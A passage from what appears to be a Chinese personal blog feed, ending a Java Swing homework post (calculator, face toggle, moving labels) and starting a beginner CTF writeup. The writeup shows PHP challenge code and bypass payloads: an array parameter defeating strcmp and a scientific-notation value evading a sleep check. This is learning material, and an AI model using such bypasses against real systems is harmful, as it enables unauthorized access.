class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> homework3;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.FlowLayout;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">calculator</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">JTextField shu1;</span><br><span class="line">JTextField shu2;</span><br><span class="line">JTextField shu3;</span><br><span class="line">JButton jia;</span><br><span class="line">JButton sub;</span><br><span class="line">JButton mul;</span><br><span class="line">JButton div;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">calculator</span><span class="params">()</span></span>&#123;</span><br><span class="line">setLayout(<span class="keyword">new</span> FlowLayout());</span><br><span class="line">shu1=<span class="keyword">new</span> JTextField(<span class="number">20</span>);</span><br><span class="line">shu2=<span class="keyword">new</span> JTextField(<span class="number">20</span>);</span><br><span class="line">jia=<span class="keyword">new</span> JButton(<span class="string">"+"</span>);</span><br><span class="line">sub=<span class="keyword">new</span> JButton(<span class="string">"-"</span>);</span><br><span class="line">mul=<span class="keyword">new</span> JButton(<span class="string">"*"</span>);</span><br><span class="line">div=<span class="keyword">new</span> JButton(<span class="string">"/"</span>);</span><br><span class="line">shu3=<span class="keyword">new</span> JTextField(<span class="number">20</span>);</span><br><span class="line">add(shu1);</span><br><span class="line">add(shu2);</span><br><span class="line">add(jia);</span><br><span class="line">add(sub);</span><br><span class="line">add(mul);</span><br><span class="line">add(div);</span><br><span class="line">add(shu3);</span><br><span class="line">setSize(<span class="number">280</span>,<span class="number">160</span>);</span><br><span class="line">setLocationRelativeTo(<span class="keyword">null</span>);</span><br><span class="line">setTitle(<span class="string">"My calculator"</span>);</span><br><span class="line">jia.addActionListener(<span class="keyword">new</span> Myactionlistener1());</span><br><span class="line">sub.addActionListener(<span class="keyword">new</span> Myactionlistener2());</span><br><span class="line">mul.addActionListener(<span class="keyword">new</span> Myactionlistener3());</span><br><span class="line">div.addActionListener(<span class="keyword">new</span> Myactionlistener4());</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myactionlistener1</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">int</span> x=Integer.parseInt(shu1.getText());</span><br><span class="line"><span class="keyword">int</span> y=Integer.parseInt(shu2.getText());</span><br><span class="line"><span class="keyword">int</span> z=x+y;</span><br><span class="line">shu3.setText(Integer.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myactionlistener2</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">int</span> x=Integer.parseInt(shu1.getText());</span><br><span class="line"><span class="keyword">int</span> y=Integer.parseInt(shu2.getText());</span><br><span class="line"><span class="keyword">int</span> z=x-y;</span><br><span class="line">shu3.setText(Integer.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myactionlistener3</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">int</span> x=Integer.parseInt(shu1.getText());</span><br><span class="line"><span class="keyword">int</span> y=Integer.parseInt(shu2.getText());</span><br><span class="line"><span class="keyword">int</span> z=x*y;</span><br><span class="line">shu3.setText(Integer.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myactionlistener4</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">double</span> x=Double.parseDouble(shu1.getText());</span><br><span class="line"><span class="keyword">double</span> y=Double.parseDouble(shu2.getText());</span><br><span class="line"><span class="keyword">double</span> z=x/y;</span><br><span class="line">shu3.setText(Double.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">calculator c=<span class="keyword">new</span> calculator();</span><br><span class="line">c.setVisible(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：分别为加减乘除的效果</p><p><img src="https://s1.ax1x.com/2018/12/31/F4BLPx.png" alt="F4BLPx.png"><img src="https://s1.ax1x.com/2018/12/31/F4DARf.png" alt="F4DARf.png"><img src="https://s1.ax1x.com/2018/12/31/F4DZQS.png" alt="F4DZQS.png"><img src="https://s1.ax1x.com/2018/12/31/F4r0BQ.png" alt="F4r0BQ.png"></p><h2 id="笑脸切换哭脸"><a href="#笑脸切换哭脸" class="headerlink" title="笑脸切换哭脸"></a>笑脸切换哭脸</h2><p><strong>要求：</strong>点击框体笑脸切换哭脸，再次点击哭脸转换为笑脸，依次循环；</p><p><strong>分析：</strong>首先需要实现画出的基础画面，drawOval实现画出脸型；fillOval实现画出眼睛；drawArc画出部分圆弧作为嘴巴；</p><p>这里的难点就是如何依次切换，在这里我设置了一个参数a=1，paint方法中，每次都会对a进行判断，如果是奇数就画出笑脸，如果是偶数就会画出哭脸，画出之后会实现a++，也就保证了下次都会向与一次不同的脸转换；</p><p><strong>源码如下：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> homework3;</span><br><span class="line"><span class="keyword">import</span> java.awt.Color;</span><br><span class="line"><span class="keyword">import</span> java.awt.Graphics;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.MouseAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">smile</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.paint(g);</span><br><span class="line">    g.setColor(Color.black);</span><br><span class="line">    g.drawOval(<span class="number">50</span>, <span class="number">50</span>, <span class="number">80</span>, <span class="number">100</span>);</span><br><span class="line">    g.fillOval(<span class="number">70</span>, <span class="number">80</span>, <span class="number">14</span>, <span class="number">7</span>);</span><br><span class="line">    g.fillOval(<span class="number">110</span>, <span class="number">80</span>, <span class="number">14</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>(a%<span class="number">2</span>==<span class="number">1</span>) &#123;</span><br><span class="line">    g.drawArc(<span class="number">70</span>, <span class="number">110</span>, <span class="number">40</span>, <span class="number">20</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    g.drawArc(<span class="number">70</span>, <span class="number">110</span>, <span class="number">40</span>, <span class="number">20</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">strartframe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.setTitle(<span class="string">"smile and cry"</span>);</span><br><span class="line">    <span class="keyword">this</span>.setSize(<span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">        <span class="keyword">this</span>.setLocationRelativeTo(<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">this</span>.addMouseListener(<span class="keyword">new</span> MouseAdapter() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mouseClicked</span><span class="params">(MouseEvent e)</span> </span>&#123;</span><br><span class="line">repaint();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">    smile s=<span class="keyword">new</span> smile();</span><br><span class="line">    s.strartframe();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong>如下为第一次运行与点击一次窗体后的结果</p><p><img src="https://s1.ax1x.com/2018/12/31/F4DsSK.png" alt="F4DsSK.png"><img src="https://s1.ax1x.com/2018/12/31/F4DyQO.png" alt="F4DyQO.png"></p><h2 id="标签移动"><a href="#标签移动" class="headerlink" title="标签移动"></a>标签移动</h2><p><strong>要求：</strong>编写一个图形用户界面程序，窗体的宽度300，高度150，布局管理器为null，窗体上有二个标签和二个按钮，标签的位置为（10,30）和（200,60），按钮的位置为（50,100）和（150,100），它们的宽度和高度都是80和20。编写一个线程，该线程可以让标签向右或向左移动10次，每次移动10个单位，间隔1秒，通过按钮的动作事件启动上述线程，“向右走”按钮启动“向右移标签”，“向左走”按钮启动“向左移标签”；</p><p><strong>分析：</strong></p><p>1.这个程序需要用到关于线程的知识，先根据题目所给出的数据添加需要用到的组件，需要用到两个标签JLabel，两个按钮JButton；</p><p>2.需要创建一个movethread类继承Thread类，里面需要判断到底是向右移动还是向左移动，这里在movethread类中设置了一个bolean类型的变量a，在构造方法中将其进行初始化，如果a==true，就右移，否则左移即可；</p><p>3.在movethread类中生成run()方法覆盖原来的run(),在此方法中对a的值进行判断，如果a为true则调用setlocation()方法，改变label的位置，调用sleep(1000)进行暂停，每一秒移动10个单位；</p><p>4.添加事件监听器；</p><p><strong>源码如下：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> homework3;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">move</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JLabel lab1;</span><br><span class="line">JLabel lab2;</span><br><span class="line">JButton b1;</span><br><span class="line">JButton b2;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startframe</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.setSize(<span class="number">300</span>, <span class="number">200</span>);</span><br><span class="line"><span class="keyword">this</span>.setTitle(<span class="string">"move"</span>);</span><br><span class="line"><span class="keyword">this</span>.setLocationRelativeTo(<span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">this</span>.setLayout(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.lab1 =<span class="keyword">new</span> JLabel(<span class="string">"右移标签"</span>);</span><br><span class="line"><span class="keyword">this</span>.lab2=<span class="keyword">new</span> JLabel(<span class="string">"左移标签"</span>);</span><br><span class="line">lab1.setBounds(<span class="number">10</span>, <span class="number">30</span>, <span class="number">80</span>, <span class="number">20</span>);</span><br><span class="line">lab2.setBounds(<span class="number">200</span>, <span class="number">60</span>, <span class="number">80</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">this</span>.add(lab1);</span><br><span class="line"><span class="keyword">this</span>.add(lab2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.b1=<span class="keyword">new</span> JButton(<span class="string">"向右"</span>);</span><br><span class="line"><span class="keyword">this</span>.b2=<span class="keyword">new</span> JButton(<span class="string">"向左"</span>);</span><br><span class="line">b1.setBounds(<span class="number">50</span>, <span class="number">100</span>, <span class="number">80</span>, <span class="number">20</span>);</span><br><span class="line">b2.setBounds(<span class="number">150</span>, <span class="number">100</span>, <span class="number">80</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">this</span>.add(b1);</span><br><span class="line"><span class="keyword">this</span>.add(b2);</span><br><span class="line"></span><br><span class="line">b1.addActionListener(<span class="keyword">new</span> myactionlistener1());</span><br><span class="line">b2.addActionListener(<span class="keyword">new</span> myactionlistener2());</span><br><span class="line"><span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">movethread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">boolean</span> a;</span><br><span class="line"><span class="keyword">int</span> size;</span><br><span class="line">JLabel lab;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">movethread</span><span class="params">(<span class="keyword">boolean</span> A)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.a=A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span> </span><br><span class="line">&#123;</span><br><span class="line">sleep(<span class="number">1000</span>);</span><br><span class="line">lab1.setLocation(lab1.getX()+<span class="number">10</span>, lab1.getY());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(InterruptedException ie)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span> </span><br><span class="line">&#123;</span><br><span class="line">sleep(<span class="number">1000</span>);</span><br><span class="line">lab2.setLocation(lab2.getX()-<span class="number">10</span>, lab2.getY());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(InterruptedException ie)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myactionlistener1</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">movethread m1=<span class="keyword">new</span> movethread(<span class="keyword">true</span>);</span><br><span class="line">m1.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myactionlistener2</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">movethread m2=<span class="keyword">new</span> movethread(<span class="keyword">false</span>);</span><br><span class="line">m2.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String Args[])</span> </span>&#123;</span><br><span class="line">move M=<span class="keyword">new</span> move();</span><br><span class="line">M.startframe();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>结果：</strong>分别是初始界面和向右向左移动后的界面，移动中两者互不影响</p><p><img src="https://s1.ax1x.com/2018/12/31/F4DvYq.png" alt="F4DvYq.png"><img src="https://s1.ax1x.com/2018/12/31/F4Dxf0.png" alt="F4Dxf0.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Java上课都没认真听过，菜的一批……
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="Java" scheme="https://gardenia30.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Drops CTF Writeup</title>
    <link href="https://gardenia30.top/2018/12/25/Drops-CTF-Writeup/"/>
    <id>https://gardenia30.top/2018/12/25/Drops-CTF-Writeup/</id>
    <published>2018-12-25T15:36:41.000Z</published>
    <updated>2019-01-13T11:06:09.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmmm……学长说挺适合新手的，就拿来做了做，发现还是可以学习一波的。<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>这题看到页面也没什么思路，非常炫酷的一个界面，老套路，拿御剑扫了一波目录，没发现什么奇怪的地方，于是查看了一波消息头，发现tips</p><p><img src="https://s1.ax1x.com/2018/12/25/FgAfzt.png" alt="img"></p><p>打开文件发现源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"***"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'repo'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'repo'</span>], $flag) == <span class="number">0</span>) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个简单的strcmp函数的绕过，只需要构造一个数组即可返回0</p><p>payload:<code>http://39.108.109.85:9000/?repo[]=0</code></p><h3 id="快一点"><a href="#快一点" class="headerlink" title="快一点"></a>快一点</h3><p>这题一开始就让<code>You need get a &#39;t&#39;</code>直接GET传一个t上去就可以看见源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]))&#123;</span><br><span class="line">    $_COOKIE[<span class="string">'bash_token'</span>] = $_GET[<span class="string">'t'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You need get a 't'"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'sleep'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($_POST[<span class="string">'sleep'</span>]))&#123;              </span><br><span class="line">                                      </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Gime me a number plz.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too short.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too long.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        sleep((int)$_POST[<span class="string">'sleep'</span>]);  </span><br><span class="line">        getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大概意思就是先传一个t，然后POST一个sleep上去，要求sleep必须要通过<strong>is_numeric()</strong>函数的验证，这个函数可以判断是否为数字和数字字符串，意思就是传一个数字字符或者数字，满足以下条件：</p><p>1.sleep&gt;=60*60*24*30*2</p><p>2.sleep&lt;=60*60*24*30*3</p><p>传了一个两个值中间的值过去，始终得不到回显，果然没有那么简单，<code>sleep()</code>是php的一个暂停函数，意思是停下sleep秒，暂停了<code>getflag()</code>的执行，采用构造一个科学计数法的方法POST了一个<code>6e6</code>回显flag</p><p><img src="https://s1.ax1x.com/2018/12/25/FgVlHU.png" alt="img"></p><p>为什么要构造科学计数法呢，这边进行了一下本地测试，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump($_GET[<span class="string">'a'</span>]);</span><br><span class="line">var_dump((int)$_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其实这就是用来测试平时GET进来的变量到底是什么类型的，测试了一下，发现所有GET进来的变量都是<strong>string</strong>类型，即使是数字也是string类型(惊呆……)学习到了……</p><p><a href="https://imgchr.com/i/Fga60S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/25/Fga60S.png" 